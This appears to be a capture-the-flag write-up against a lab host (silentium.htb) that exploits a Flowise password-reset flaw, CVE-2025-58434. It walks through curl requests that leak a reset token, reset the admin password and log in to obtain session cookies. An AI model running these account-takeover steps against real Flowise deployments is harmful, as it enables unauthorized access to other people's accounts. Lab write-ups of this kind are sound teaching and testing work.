## Getting Into Flowise - CVE-2025-58434

### The Vulnerability

The forgot password endpoint in Flowise returns the password reset token directly in the API response. No authentication needed. If you know a valid email address, you can reset any account.

### Finding the Email

From the leadership section on the main site we have the name "Ben". Testing `ben@silentium.htb` against the forgot password endpoint:

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

The response gives us everything we need:

```json
{
  "user": {
    "name": "admin",
    "email": "ben@silentium.htb",
    "tempToken": "DIxp6KWmZXhgJiPacLRY0fBbwnbhbDT8hkUhJHATCF6tIFnVH6A6iKl6OJGDWKSN",
    "tokenExpiry": "2026-05-05T06:06:57.191Z",
    "status": "active"
  }
}
```

The tempToken is sitting right there in the response. Ben is also the admin account.

### Finding the Reset Endpoint Format

Rather than guessing the payload format, we can pull the reset password JavaScript chunk from the site to see exactly what fields the API expects:

```bash
curl -s "http://staging.silentium.htb/assets/resetPassword-cNBhmed-.js"
```

Inside we find:

```javascript
const G = {user: {email: y, tempToken: c, password: o}};
```

### Resetting the Password

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "user": {
      "email": "ben@silentium.htb",
      "tempToken": "DIxp6KWmZXhgJiPacLRY0fBbwnbhbDT8hkUhJHATCF6tIFnVH6A6iKl6OJGDWKSN",
      "password": "Hacker123!"
    }
  }'
```

Gets a 201 Created back. Password is now reset.

### Logging In

The login endpoint is not obvious from the URL. Pulling the auth JavaScript bundle reveals it:

```bash
curl -s "http://staging.silentium.htb/assets/auth-15PRqe3J.js"
```

```javascript
const e = s => o.post("/auth/login", s)
```

So the endpoint is `/api/v1/auth/login`:

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb","password":"Hacker123!"}' \
  -c cookies.txt -D headers.txt
```

We get a 200 back with three cookies set - a JWT access token, a refresh token, and a session ID.

